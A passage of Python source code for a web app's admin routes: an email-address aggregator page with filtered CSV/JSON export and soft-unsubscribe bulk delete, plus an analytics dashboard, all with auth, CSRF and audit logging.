    parts: list[str] = []
    for label in _EMAIL_SOURCE_LABELS:
        n = int(counts.get(label, 0) or 0)
        parts.append(
            f'<span class="adm-ea-total">'
            f'<span class="adm-ea-total__label">{html.escape(label)}</span>'
            f'<span class="adm-ea-total__value">{n:,}</span>'
            f'</span>'
        )
    return "".join(parts)


def _render_email_stats_cards(counts: dict, recent_week: int) -> str:
    """Render the 5-card stats strip above the filter bar.

    Cards (in render order):
      1. Total          — sum of every distinct email across all sources.
      2. Newsletter     — confirmed/pending newsletter subscribers.
      3. Prerelease     — pre-release waitlist signups.
      4. Outbound queue — emails currently in the background_jobs outbox.
      5. This week      — distinct emails first seen in the last 7 days.

    Monochrome by spec — no badge colour, no delta arrows. Numbers are
    Geist Mono via ``.adm-ea-stat-value``; labels are Inter via
    ``.adm-ea-stat-label``. Card chrome comes from
    ``static/pages/admin_email_addresses.css``.
    """
    # Total = distinct emails across every source. Sources double-count
    # multi-source emails so summing the counts dict overstates it; the
    # totals badge row uses the same convention. For this top-level card
    # we use the same rolled-up convention so the math reconciles with
    # the badges below.
    total = sum(int(v or 0) for v in counts.values())
    newsletter = int(counts.get("newsletter", 0) or 0)
    prerelease = int(counts.get("prerelease", 0) or 0)
    outbound = int(counts.get("outbound", 0) or 0)
    recent = int(recent_week or 0)

    cards = (
        ("Total", total),
        ("Newsletter", newsletter),
        ("Prerelease waitlist", prerelease),
        ("Outbound queue", outbound),
        ("This week", recent),
    )
    parts: list[str] = []
    for label, value in cards:
        parts.append(
            '<div class="adm-ea-stat-card">'
            f'<span class="adm-ea-stat-label">{html.escape(label)}</span>'
            f'<span class="adm-ea-stat-value">{int(value):,}</span>'
            '</div>'
        )
    return "".join(parts)


def _render_email_bulk_footer() -> str:
    """Build the bulk-select footer chip + inline handler script.

    The footer is hidden until at least one row checkbox is ticked. The
    JS handler watches three concerns:

      1. The header ``[data-bulk-select-all]`` checkbox — toggles every row.
      2. Per-row ``[data-bulk-select]`` checkboxes — recompute the count.
      3. The "Clear selection" button in the footer — unticks every row.

    No bulk action is wired yet — selection mechanism only. Styling is
    inline against narve tokens so this whole feature lives in
    ``admin_routes.py`` without touching the page CSS bundle.
    """
    footer_html = (
        '<div id="adm-ea-bulk-footer" data-count="0" hidden '
        'aria-live="polite" '
        'style="position:sticky;bottom:16px;margin:16px 0 0;'
        'padding:10px 14px;border:1px solid var(--border-default);'
        'border-radius:var(--radius-md,8px);background:var(--bg-surface);'
        'display:flex;align-items:center;justify-content:space-between;'
        'gap:12px;font-family:var(--font-ui);font-size:13px;'
        'color:var(--text-primary);">'
        '<span style="font-weight:500;">'
        '<span id="adm-ea-bulk-count" style="font-family:var(--font-mono);'
        'font-variant-numeric:tabular-nums;">0</span> selected'
        '</span>'
        '<span style="display:flex;align-items:center;gap:8px;">'
        '<button type="button" id="adm-ea-bulk-export" '
        'style="font-family:var(--font-ui);font-size:12px;'
        'background:transparent;border:1px solid var(--border-default);'
        'border-radius:var(--radius-sm,6px);padding:6px 12px;'
        'color:var(--text-primary);cursor:pointer;">'
        'Export selected'
        '</button>'
        '<button type="button" id="adm-ea-bulk-delete" '
        'style="font-family:var(--font-ui);font-size:12px;'
        'background:transparent;border:1px solid var(--border-default);'
        'border-radius:var(--radius-sm,6px);padding:6px 12px;'
        'color:var(--text-primary);cursor:pointer;">'
        'Delete selected'
        '</button>'
        '<button type="button" id="adm-ea-bulk-clear" '
        'style="font-family:var(--font-ui);font-size:12px;'
        'background:transparent;border:1px solid var(--border-default);'
        'border-radius:var(--radius-sm,6px);padding:6px 12px;'
        'color:var(--text-primary);cursor:pointer;">'
        'Clear selection'
        '</button>'
        '</span>'
        '</div>'
    )
    script_html = (
        '<script>'
        '(()=>{'
        '"use strict";'
        'if(window.__admEaBulkSelectInstalled)return;'
        'window.__admEaBulkSelectInstalled=true;'
        'const rowBoxes=()=>Array.prototype.slice.call('
        'document.querySelectorAll("[data-bulk-select]"));'
        'const selectAllBox=()=>document.querySelector("[data-bulk-select-all]");'
        'const footer=()=>document.getElementById("adm-ea-bulk-footer");'
        'const countEl=()=>document.getElementById("adm-ea-bulk-count");'
        'function refresh(){'
        'const boxes=rowBoxes();'
        'const selected=boxes.filter(b=>b.checked).length;'
        'const c=countEl();if(c)c.textContent=String(selected);'
        'const f=footer();'
        'if(f){f.hidden=selected===0;f.setAttribute("data-count",String(selected));}'
        'const head=selectAllBox();'
        'if(head){'
        'if(boxes.length===0||selected===0){head.checked=false;head.indeterminate=false;}'
        'else if(selected===boxes.length){head.checked=true;head.indeterminate=false;}'
        'else{head.checked=false;head.indeterminate=true;}'
        '}'
        '}'
        'document.addEventListener("change",ev=>{'
        'const t=ev.target;if(!t||!t.hasAttribute)return;'
        'if(t.hasAttribute("data-bulk-select-all")){'
        'const wanted=!!t.checked;'
        'rowBoxes().forEach(b=>{b.checked=wanted;});'
        'refresh();return;'
        '}'
        'if(t.hasAttribute("data-bulk-select")){refresh();}'
        '});'
        'document.addEventListener("click",ev=>{'
        'const t=ev.target;if(!t)return;'
        'if(t.id==="adm-ea-bulk-clear"){'
        'ev.preventDefault();'
        'rowBoxes().forEach(b=>{b.checked=false;});'
        'const head=selectAllBox();'
        'if(head){head.checked=false;head.indeterminate=false;}'
        'refresh();'
        '}'
        '});'
        'refresh();'
        '})();'
        '</script>'
    )
    return footer_html + script_html


def _render_email_rows(rows: list) -> str:
    """Render the table body as one <tr> per deduplicated email.

    Each row links the user_id cell to /admin/users where applicable, so
    the admin can pivot into the per-user surface without copy-pasting.
    Sources beyond the primary are stacked after a hairline separator so
    the column reads "newsletter · enquiry · outbound" when a single email
    appears in multiple buckets.
    """
    if not rows:
        return ""
    out: list[str] = []
    for r in rows:
        email = html.escape(r.get("email") or "")
        primary_source = html.escape(r.get("source") or "")
        extras = [s for s in (r.get("all_sources") or []) if s != r.get("source")]
        source_cell = f'<span class="adm-ea-source__primary">{primary_source}</span>'
        if extras:
            extra_strs = []
            for s in extras:
                extra_strs.append(
                    f'<span class="adm-ea-source__sep">·</span>'
                    f'<span class="adm-ea-source__extra">{html.escape(s)}</span>'
                )
            source_cell += "".join(extra_strs)

        first_seen = _fmt_email_addresses_ts(r.get("first_seen"))
        last_ts = _fmt_email_addresses_ts(r.get("ts"))
        uid = r.get("user_id")
        if uid:
            uid_cell = (
                f'<a href="/admin/users?q={html.escape(str(r.get("email") or ""))}">'
                f'#{int(uid)}</a>'
            )
        else:
            uid_cell = "—"
        status = html.escape(r.get("status") or "—")

        raw_email_attr = html.escape(r.get("email") or "", quote=True)
        out.append(
            "<tr>"
            f'<td class="adm-ea-td--select">'
            f'<input type="checkbox" data-bulk-select '
            f'value="{raw_email_attr}" '
            f'aria-label="Select row"></td>'
            f'<td class="adm-ea-td--email">{email}</td>'
            f'<td class="adm-ea-td--source"><span class="adm-ea-source">{source_cell}</span></td>'
            f'<td class="adm-ea-td--ts">{first_seen}</td>'
            f'<td class="adm-ea-td--ts">{last_ts}</td>'
            f'<td class="adm-ea-td--uid">{uid_cell}</td>'
            f'<td class="adm-ea-td--status">{status}</td>'
            "</tr>"
        )
    return "".join(out)


def _build_export_querystring(filters: dict) -> str:
    """Stringify the active filters into a querystring for the CSV/JSON links.

    Mirrors the page's own filter querystring so the user gets the
    currently-viewed subset rather than the full dataset on export.
    Empty filters are dropped to keep the URL short.
    """
    from urllib.parse import urlencode
    pairs = [(k, v) for k, v in filters.items() if v]
    return urlencode(pairs)


async def email_addresses_page(request: Request):
    """GET /admin/email-addresses — unified email aggregator page.

    Read-only admin surface. Filters are passed via querystring so
    bookmarks + the export links can carry the same subset. Pagination
    is implicit (top 500 by default — anything beyond export to CSV).
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    source = (qp.get("source") or "").strip().lower()
    status_filter = (qp.get("status") or "").strip().lower()
    since_str = (qp.get("since") or "").strip()
    until_str = (qp.get("until") or "").strip()
    sort = (qp.get("sort") or "ts").strip().lower()
    sort_dir = (qp.get("dir") or "desc").strip().lower()

    if source and source not in _EMAIL_SOURCE_LABELS:
        source = ""
    if status_filter and status_filter not in _EMAIL_STATUS_LABELS:
        status_filter = ""
    if sort not in {"ts", "first_seen", "email", "source", "status", "user_id"}:
        sort = "ts"
    if sort_dir not in {"asc", "desc"}:
        sort_dir = "desc"

    since_ts = _parse_date_to_ts(since_str)
    until_ts = _parse_date_to_ts(until_str)
    if until_ts is not None:
        # Treat the until-date as inclusive end-of-day.
        until_ts += 86_399

    rows = db.aggregate_email_addresses(
        source=source or None,
        q=q or None,
        since=since_ts,
        until=until_ts,
        limit=500,
        offset=0,
        sort=sort,
        sort_dir=sort_dir,
    )
    if status_filter:
        rows = [r for r in rows if (r.get("status") or "").lower() == status_filter]

    counts = db.count_email_addresses_by_source()
    # "This week" stats card: distinct emails first seen in the last 7d.
    # Cheap — same in-memory aggregate as the totals.
    try:
        recent_week = int(db.count_emails_recent(days=7))
    except Exception:
        # Defence-in-depth: a stats query failure should never 500 the
        # whole page. Fall back to 0 and keep rendering.
        log.exception("count_emails_recent failed; rendering with 0")
        recent_week = 0

    export_qs = _build_export_querystring({
        "q": q, "source": source, "status": status_filter,
        "since": since_str, "until": until_str,
    })
    csv_href = "/admin/email-addresses/export.csv" + (f"?{export_qs}" if export_qs else "")
    json_href = "/admin/email-addresses/export.json" + (f"?{export_qs}" if export_qs else "")
    sort_headers_html = _render_email_sort_headers(sort, sort_dir, export_qs)

    # Empty state — render via the canonical render_empty() helper so
    # /admin/email-addresses uses the same nv-empty chrome as every other
    # admin surface. Action buttons hand the admin a one-click route back
    # to a clean filter set.
    empty_state = ""
    if not rows:
        empty_state = _srv().render_empty(
            title="No matches",
            body=(
                "No emails match the current filters. Loosen the search "
                "or clear filters to see every collected address."
            ),
            actions=[
                {
                    "label": "Clear filters",
                    "href": "/admin/email-addresses",
                    "primary": True,
                },
                {
                    "label": "Back to admin",
                    "href": "/admin",
                },
            ],
        )

    # Bulk-select footer + handler. Selection-only at this stage; the
    # footer chip stays hidden until at least one row is ticked. Rendered
    # inside the existing raw_empty_state slot so the template doesn't
    # need a new placeholder. CSS-light by design — uses inline styling
    # that respects narve tokens, no per-page CSS edits.
    bulk_footer_html = _render_email_bulk_footer() if rows else ""
    empty_state = empty_state + bulk_footer_html

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/email_addresses.html",
        page_title="Email addresses",
        active_route="email-addresses",
        breadcrumb=[
            ("Admin", "/admin"),
            ("Email addresses", "/admin/email-addresses"),
        ],
        filter_q=q,
        filter_since=since_str,
        filter_until=until_str,
        result_count=f"{len(rows):,}",
        export_csv_href=csv_href,
        export_json_href=json_href,
        raw_source_options=_render_email_source_options(source),
        raw_status_options=_render_email_status_options(status_filter),
        raw_totals_badges=_render_email_totals_badges(counts),
        raw_stats_cards=_render_email_stats_cards(counts, recent_week),
        raw_rows=_render_email_rows(rows),
        raw_sort_headers=sort_headers_html,
        raw_empty_state=empty_state,
    )


# Cap on the per-request ``emails=`` selection list, applied to both
# the GET querystring path and the POST overflow path. Generous enough
# to cover plausible manual click-selection while bounding work per
# request (the filter is applied in-memory after the page-limit fetch,
# so an unbounded list could balloon RAM). Mirror this in the page JS
# so the user gets a toast instead of a silently-truncated CSV.
_EMAIL_EXPORT_SELECTION_CAP = 500


def _parse_emails_param(raw: str | None) -> list[str]:
    """Normalise a comma-separated ``emails=`` payload.

    Lowercases and dedupes, preserving first-seen order. Drops malformed
    entries silently — the page's checkbox state is the source of truth
    and we don't want a stray comma to 400 a download. Honours
    ``_EMAIL_EXPORT_SELECTION_CAP`` to bound work.
    """
    if not raw:
        return []
    seen: set[str] = set()
    out: list[str] = []
    for chunk in str(raw).split(","):
        e = chunk.strip().lower()
        if not e or e in seen:
            continue
        # Cheap shape check — keep anything with an ``@`` and no whitespace.
        if "@" not in e or any(c.isspace() for c in e):
            continue
        seen.add(e)
        out.append(e)
        if len(out) >= _EMAIL_EXPORT_SELECTION_CAP:
            break
    return out


def _email_addresses_csv_response(
    admin,
    request,
    *,
    q: str,
    source: str,
    status_filter: str,
    since_ts: int | None,
    until_ts: int | None,
    emails: list[str] | None,
):
    """Shared CSV body for both the GET and POST export paths.

    ``emails`` (lowercased) intersects the filtered result set so a
    bulk-select export ships only the checked rows. When None/empty,
    falls back to the legacy "everything matching the filter" behaviour.
    """
    rows = db.aggregate_email_addresses(
        source=source or None,
        q=q or None,
        since=since_ts,
        until=until_ts,
        limit=5000,
        offset=0,
    )
    if status_filter:
        rows = [r for r in rows if (r.get("status") or "").lower() == status_filter]

    selection_mode = bool(emails)
    if selection_mode:
        wanted = set(emails or [])
        rows = [r for r in rows if (r.get("email") or "").lower() in wanted]

    import csv as _csv
    import io as _io
    buf = _io.StringIO()
    w = _csv.writer(buf)
    w.writerow([
        "email", "source", "first_seen", "last_activity",
        "user_id", "status", "all_sources",
    ])
    for r in rows:
        w.writerow([
            _csv_safe_cell(r.get("email") or ""),
            _csv_safe_cell(r.get("source") or ""),
            _csv_safe_cell(_fmt_email_addresses_ts(r.get("first_seen"))),
            _csv_safe_cell(_fmt_email_addresses_ts(r.get("ts"))),
            _csv_safe_cell(r.get("user_id") if r.get("user_id") is not None else ""),
            _csv_safe_cell(r.get("status") or ""),
            _csv_safe_cell("|".join(r.get("all_sources") or [])),
        ])

    try:
        from security import audit as _a
        sel_note = f" selected={len(emails or [])}" if selection_mode else ""
        _audit(
            getattr(_a.AuditAction, "EMAIL_ADDRESSES_EXPORT", "admin.email_addresses.export"),
            admin=admin, request=request,
            target_type="email_addresses_export",
            target_description=(
                f"csv · {len(rows)} rows" + (" · selection" if selection_mode else "")
            ),
            notes=(
                f"q={q!r} source={source!r} status={status_filter!r}{sel_note}"
            ),
        )
    except Exception:
        pass

    fname = (
        "email_addresses_selected.csv" if selection_mode else "email_addresses.csv"
    )
    from fastapi.responses import Response as _Response
    return _Response(
        content=buf.getvalue(),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": f'attachment; filename="{fname}"',
            "Cache-Control": "no-store",
        },
    )


async def email_addresses_export_csv(request: Request):
    """GET /admin/email-addresses/export.csv — CSV download of filtered rows.

    Mirrors the page's filter set. Cap at 5000 rows so an admin who
    forgets to filter doesn't accidentally export 100MB. Uses
    ``_csv_safe_cell`` to defang spreadsheet formula injection in the
    email + status columns.

    Optional ``?emails=a@x.com,b@y.com,...`` query param intersects the
    filtered set with the supplied list — used by the page's "Export
    selected" bulk action when the URL stays short. Capped at
    ``_EMAIL_EXPORT_SELECTION_CAP`` emails per request. When the URL
    would exceed ~2000 chars the page falls back to the POST handler
    below.
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    source = (qp.get("source") or "").strip().lower()
    status_filter = (qp.get("status") or "").strip().lower()
    since_ts = _parse_date_to_ts(qp.get("since"))
    until_ts = _parse_date_to_ts(qp.get("until"))
    if until_ts is not None:
        until_ts += 86_399

    if source and source not in _EMAIL_SOURCE_LABELS:
        source = ""
    if status_filter and status_filter not in _EMAIL_STATUS_LABELS:
        status_filter = ""

    emails = _parse_emails_param(qp.get("emails"))

    return _email_addresses_csv_response(
        admin, request,
        q=q, source=source, status_filter=status_filter,
        since_ts=since_ts, until_ts=until_ts,
        emails=emails,
    )


async def email_addresses_export_csv_post(request: Request):
    """POST /admin/email-addresses/export.csv — selection-export overflow.

    Same contract as the GET handler but the ``emails`` payload arrives
    in the form body so admins can export selections too long to fit in
    a URL (the page falls back here once the GET URL would exceed
    ~2000 chars). Filter context is also accepted as form fields so the
    same intersection logic runs.

    CSRF is enforced by the global middleware; the page sends the
    cookie-derived token as ``x-csrf-token`` alongside the form body.
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    form = await request.form()
    q = (form.get("q") or "").strip()
    source = (form.get("source") or "").strip().lower()
    status_filter = (form.get("status") or "").strip().lower()
    since_ts = _parse_date_to_ts(form.get("since"))
    until_ts = _parse_date_to_ts(form.get("until"))
    if until_ts is not None:
        until_ts += 86_399

    if source and source not in _EMAIL_SOURCE_LABELS:
        source = ""
    if status_filter and status_filter not in _EMAIL_STATUS_LABELS:
        status_filter = ""

    # Accept either a single comma-separated ``emails`` field (matches the
    # GET contract) or multiple ``emails`` fields (FormData.append). The
    # page uses the comma-separated form for simpler payloads.
    raw_emails: list[str] = []
    if hasattr(form, "getlist"):
        raw_emails = [v for v in form.getlist("emails") if isinstance(v, str)]
    if not raw_emails:
        single = form.get("emails")
        if isinstance(single, str):
            raw_emails = [single]
    emails = _parse_emails_param(",".join(raw_emails)) if raw_emails else []

    return _email_addresses_csv_response(
        admin, request,
        q=q, source=source, status_filter=status_filter,
        since_ts=since_ts, until_ts=until_ts,
        emails=emails,
    )


async def email_addresses_export_json(request: Request):
    """GET /admin/email-addresses/export.json — JSON dump of filtered rows.

    Same filter contract as the CSV exporter. Returns a minimal object
    with a ``rows`` array and a ``count`` integer so a downstream script
    can sanity-check the cap was hit (count == 5000 → re-run with filters).
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    source = (qp.get("source") or "").strip().lower()
    status_filter = (qp.get("status") or "").strip().lower()
    since_ts = _parse_date_to_ts(qp.get("since"))
    until_ts = _parse_date_to_ts(qp.get("until"))
    if until_ts is not None:
        until_ts += 86_399

    if source and source not in _EMAIL_SOURCE_LABELS:
        source = ""
    if status_filter and status_filter not in _EMAIL_STATUS_LABELS:
        status_filter = ""

    rows = db.aggregate_email_addresses(
        source=source or None,
        q=q or None,
        since=since_ts,
        until=until_ts,
        limit=5000,
        offset=0,
    )
    if status_filter:
        rows = [r for r in rows if (r.get("status") or "").lower() == status_filter]

    # Strip internal-only keys before serialising.
    public = []
    for r in rows:
        public.append({
            "email": r.get("email"),
            "source": r.get("source"),
            "all_sources": list(r.get("all_sources") or []),
            "first_seen": r.get("first_seen"),
            "last_activity": r.get("ts"),
            "user_id": r.get("user_id"),
            "status": r.get("status"),
        })

    try:
        from security import audit as _a
        _audit(
            getattr(_a.AuditAction, "EMAIL_ADDRESSES_EXPORT", "admin.email_addresses.export"),
            admin=admin, request=request,
            target_type="email_addresses_export",
            target_description=f"json · {len(rows)} rows",
            notes=f"q={q!r} source={source!r} status={status_filter!r}",
        )
    except Exception:
        pass

    return JSONResponse({"count": len(public), "rows": public})


async def email_addresses_bulk_delete(request: Request):
    """POST /admin/email-addresses/bulk-delete — wire for the "Delete
    selected" footer button on /admin/email-addresses.

    JSON body: ``{"emails": ["a@b.com", ...]}``. Requires admin auth and
    CSRF (double-checked in-handler on top of the middleware).

    Behaviour per email (safety over completeness):
      * Always call ``db.unsubscribe_newsletter(email)`` — soft-marks the
        newsletter row as unsubscribed (UPDATE, not DELETE).
      * If the row was on the newsletter list, returns True; otherwise
        False. Either way we log a NEWSLETTER_UNSUBSCRIBE audit row
        attributing the action to the admin so non-newsletter rows leave
        a footprint without us touching ``users`` / ``enquiries`` /
        ``feedback`` (cascade fanout).

    Returns ``{"deleted": N, "errors": [...]}`` where ``deleted`` counts
    newsletter rows that flipped to unsubscribed. Non-newsletter rows
    surface in ``errors`` so the UI can warn that those weren't actioned.

    Hard cap of 500 emails per request — anyone wanting more should use
    the export → script path rather than holding an HTTP connection open.
    """
    admin = _require_admin_user(request)
    if admin is None:
        return _denied_response(request)

    srv = _srv()
    submitted = request.headers.get(
        getattr(srv, "CSRF_HEADER_NAME", "x-csrf-token")
    )
    if not srv._validate_csrf(request, submitted):
        raise HTTPException(status_code=403, detail="CSRF validation failed")

    try:
        body = await request.json()
    except (json.JSONDecodeError, ValueError):
        raise HTTPException(status_code=400, detail="Invalid JSON body")

    raw_emails = body.get("emails") if isinstance(body, dict) else None
    if not isinstance(raw_emails, list) or not raw_emails:
        raise HTTPException(status_code=400, detail="emails list required")

    seen: set[str] = set()
    emails: list[str] = []
    for e in raw_emails[:500]:
        if not isinstance(e, str):
            continue
        lower = e.strip().lower()
        if not lower or lower in seen:
            continue
        seen.add(lower)
        emails.append(lower)

    deleted = 0
    errors: list[dict] = []
    from security import audit as _a

    for email in emails:
        try:
            unsubscribed = db.unsubscribe_newsletter(email)
        except Exception as exc:
            log.exception("bulk-delete unsubscribe failed for %s", email)
            errors.append({"email": email, "error": str(exc)})
            continue

        if unsubscribed:
            deleted += 1
            notes = "bulk delete via /admin/email-addresses"
        else:
            # Non-newsletter row — leave the upstream record alone (FK
            # cascade would chain into users/enquiries/feedback). Just
            # audit the admin's intent.
            errors.append({
                "email": email,
                "error": "not on newsletter list — skipped (no DELETE)",
            })
            notes = (
                "bulk delete via /admin/email-addresses — "
                "non-newsletter row, no-op"
            )

        try:
            _audit(
                _a.AuditAction.NEWSLETTER_UNSUBSCRIBE,
                admin=admin, request=request,
                target_type="newsletter_subscribers",
                target_description=email,
                notes=notes,
            )
        except Exception:
            log.exception("bulk-delete audit failed for %s", email)

    return JSONResponse({"deleted": deleted, "errors": errors})


# ── /admin/analytics — page-view + event dashboard ──────────────────────


# Whitelist of column keys the top-pages table can be sorted by. Mirrors
# the keys produced by db.get_top_pages so a malicious ?sort= can't crash
# the page or expose dict internals.
_ANALYTICS_PAGE_SORT_FIELDS = ("views", "unique_visitors", "page")


def _fmt_analytics_ts(ts) -> str:
    """Compact YYYY-MM-DD HH:MM for the last-seen column. Returns ``—`` on
    missing/zero so the dense table reads cleanly."""
    if not ts:
        return "—"
    try:
        return _dt.datetime.utcfromtimestamp(int(ts)).strftime("%Y-%m-%d %H:%M")
    except (TypeError, ValueError, OverflowError):
        return "—"


def _render_analytics_stats_cards(summary: dict) -> str:
    """Render the 5-card stats strip across the top of the page."""
    cards = (
        ("Total events", summary.get("total_events", 0), ""),
        (
            "Unique visitors",
            summary.get("unique_visitors", 0),
            "visitor_id + ip_hash",
        ),
        ("Page views", summary.get("page_views", 0), ""),
        ("Newsletter signups", summary.get("newsletter_signups", 0), ""),
        ("Logins", summary.get("logins", 0), ""),
    )
    parts: list[str] = []
    for label, value, note in cards:
        note_html = (
            f'<span class="adm-an-stat-note">{html.escape(note)}</span>'
            if note else ""
        )
        parts.append(
            '<div class="adm-an-stat-card">'
            f'<span class="adm-an-stat-label">{html.escape(label)}</span>'
            f'<span class="adm-an-stat-value">{int(value or 0):,}</span>'
            f'{note_html}'
            '</div>'
        )
    return "".join(parts)


def _render_analytics_sparkline_svg(series: list[dict]) -> str:
    """Render a monochrome SVG sparkline for the daily page-view series.

    Layout uses a viewBox so the SVG scales to the container width.
    Both the line and a translucent area fill use ``var(--text-primary)``
    so the chart remains strictly monochrome and theme-aware.
    """
    if not series:
        return (
            '<svg class="adm-an-spark__svg" viewBox="0 0 600 96" '
            'preserveAspectRatio="none" aria-hidden="true"></svg>'
        )
    width = 600
    height = 96
    n = len(series)
    counts = [int(p.get("count") or 0) for p in series]
    max_v = max(counts) if counts else 0
    # Step between points along X. Single-point series degenerates to a
    # vertical anchor at x=0; the area path stays valid in both cases.
    step = (width / (n - 1)) if n > 1 else 0
    # Reserve 4px top + 4px bottom padding so the line never clips into
    # the border-radius of the wrapper.
    pad_top = 4
    pad_bot = 4
    h_eff = height - pad_top - pad_bot
    points: list[str] = []
    for i, v in enumerate(counts):
        x = i * step
        y = (height - pad_bot) if max_v == 0 else (
            pad_top + (1.0 - (v / max_v)) * h_eff
        )
        points.append(f"{x:.1f},{y:.1f}")
    line_d = "M " + " L ".join(points)
    area_d = (
        f"{line_d} L {(n - 1) * step:.1f},{height - pad_bot:.1f} "
        f"L 0,{height - pad_bot:.1f} Z"
    )
    return (
        f'<svg class="adm-an-spark__svg" viewBox="0 0 {width} {height}" '
        'preserveAspectRatio="none" aria-hidden="true">'
        f'<path class="adm-an-spark__area" d="{area_d}"/>'
        f'<path class="adm-an-spark__line" d="{line_d}"/>'
        '</svg>'
    )


def _render_analytics_pages_sort_headers(
    sort: str,
    sort_dir: str,
    base_qs: str,
) -> str:
    """Build the top-pages table header row with sortable column anchors."""
    def header(key: str, label: str, align_right: bool = False) -> str:
        is_active = (sort == key)
        next_dir = "asc" if (is_active and sort_dir == "desc") else "desc"
        arrow = ""
        if is_active:
            glyph = "↓" if sort_dir == "desc" else "↑"
            arrow = f'<span class="adm-an-sort-arrow" aria-hidden="true">{glyph}</span>'
        # Preserve filter context — append sort/dir to the page's existing
        # query string.
        from urllib.parse import urlencode, parse_qsl
        existing = dict(parse_qsl(base_qs))
        existing["sort"] = key
        existing["dir"] = next_dir
        href = "/admin/analytics?" + urlencode(existing)
        cls_th = "adm-an-th"
        if align_right:
            cls_th += " adm-an-th--num"
        if is_active:
            cls_th += " adm-an-th--active"
        return (
            f'<th class="{cls_th}">'
            f'<a class="adm-an-th-link" href="{html.escape(href, quote=True)}">'
            f'{html.escape(label)}{arrow}'
            f'</a></th>'
        )

    return (
        header("page", "Page")
        + header("views", "Views", align_right=True)
        + header("unique_visitors", "Uniques", align_right=True)
    )


def _render_analytics_pages_rows(rows: list[dict]) -> str:
    """Render the top-pages table body. Renders an explicit empty row
    when there's no data so the wrapper doesn't collapse to zero height."""
    if not rows:
        return (
            '<tr><td colspan="3" class="adm-an-empty">'
            '<p class="adm-an-empty__hint">No page views in this window.</p>'
            '</td></tr>'
        )
    parts: list[str] = []
    for r in rows:
        page = html.escape(str(r.get("page") or "(unknown)"))
        views = int(r.get("views") or 0)
        uniques = int(r.get("unique_visitors") or 0)
        parts.append(
            "<tr>"
            f'<td class="adm-an-td--page">{page}</td>'
            f'<td class="adm-an-td--num">{views:,}</td>'
            f'<td class="adm-an-td--num">{uniques:,}</td>'
            "</tr>"
        )
    return "".join(parts)


def _render_analytics_events_rows(rows: list[dict]) -> str:
    if not rows:
        return (
            '<tr><td colspan="3" class="adm-an-empty">'
            '<p class="adm-an-empty__hint">No events in this window.</p>'
            '</td></tr>'
        )
    parts: list[str] = []
    for r in rows:
        et = html.escape(str(r.get("event_type") or "(unknown)"))
        cnt = int(r.get("count") or 0)
        last_seen = _fmt_analytics_ts(r.get("last_seen"))
        parts.append(
            "<tr>"
            f'<td class="adm-an-td--event">{et}</td>'
            f'<td class="adm-an-td--num">{cnt:,}</td>'
            f'<td class="adm-an-td--ts">{html.escape(last_seen)}</td>'
            "</tr>"
        )
    return "".join(parts)


def _resolve_analytics_window(qp) -> tuple[int, int, str, str]:
    """Parse since/until from query params, returning (since, until,
    since_str, until_str). Defaults to the trailing 30 days when neither
    bound is given."""
    since_str = (qp.get("since") or "").strip()
    until_str = (qp.get("until") or "").strip()
    since_ts = _parse_date_to_ts(since_str)
    until_ts = _parse_date_to_ts(until_str)
    if until_ts is not None:
        until_ts += 86_399  # inclusive end-of-day
    now = int(time.time())
    if until_ts is None:
        until_ts = now
    if since_ts is None:
        since_ts = until_ts - 30 * 86_400
    return since_ts, until_ts, since_str, until_str


async def analytics_dashboard(request: Request):
    """GET /admin/analytics — page-view + event dashboard.

    Read-only admin surface. Window defaults to the last 30 days; filter
    bar lets admins narrow with since/until. Top-pages table is sortable
    via querystring (?sort=views|unique_visitors|page&dir=asc|desc).
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    since_ts, until_ts, since_str, until_str = _resolve_analytics_window(qp)

    sort = (qp.get("sort") or "views").strip().lower()
    if sort not in _ANALYTICS_PAGE_SORT_FIELDS:
        sort = "views"
    sort_dir = (qp.get("dir") or "desc").strip().lower()
    if sort_dir not in ("asc", "desc"):
        sort_dir = "desc"

    summary = db.get_analytics_summary(since_ts, until_ts)
    top_pages = db.get_top_pages(since_ts, until_ts, limit=20)
    top_events = db.get_top_events(since_ts, until_ts, limit=20)

    # In-Python sort so the user can flip the order without re-querying.
    def _page_sort_key(row):
        v = row.get(sort)
        if sort == "page":
            return (v or "").lower()
        return v or 0
    top_pages.sort(key=_page_sort_key, reverse=(sort_dir != "asc"))

    # Sparkline always shows the trailing 30 days, independent of the
    # filter window — the filter scopes the tables + cards, not the
    # trendline. Mirrors how most analytics dashboards behave.
    spark_until = int(time.time())
    spark_since = spark_until - 30 * 86_400
    spark_series = db.get_analytics_daily_page_views(spark_since, spark_until)
    spark_total = sum(int(p.get("count") or 0) for p in spark_series)
    spark_start = spark_series[0]["date"] if spark_series else ""
    spark_end = spark_series[-1]["date"] if spark_series else ""

    # Build the CSV-export href off the filter context.
    from urllib.parse import urlencode
    export_qs = urlencode([
        (k, v) for k, v in (("since", since_str), ("until", until_str))
        if v
    ])
    csv_href = "/admin/analytics/export.csv" + (f"?{export_qs}" if export_qs else "")

    # Window label for the summary strip. Uses the same YYYY-MM-DD format
    # as the filter inputs so it reconciles visually.
    def _fmt_d(ts):
        return _dt.datetime.utcfromtimestamp(int(ts)).strftime("%Y-%m-%d")
    window_label = f"{_fmt_d(since_ts)} → {_fmt_d(until_ts)}"

    # Stable base-qs for the sort-header link builder. We only need the
    # filter context (since/until); sort/dir are re-set by each header.
    base_qs = urlencode([
        (k, v) for k, v in (("since", since_str), ("until", until_str))
        if v
    ])

    raw_empty_state = ""
    if summary.get("total_events", 0) == 0:
        raw_empty_state = _srv().render_empty(
            title="No analytics events",
            body=(
                "No events match the current window. Widen the date range "
                "or clear the filter to see every recorded event."
            ),
            actions=[
                {"label": "Clear filter", "href": "/admin/analytics", "primary": True},
                {"label": "Back to admin", "href": "/admin"},
            ],
        )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/analytics.html",
        page_title="Analytics",
        active_route="analytics",
        breadcrumb=[
            ("Admin", "/admin"),
            ("Analytics", "/admin/analytics"),
        ],
        filter_since=since_str,
        filter_until=until_str,
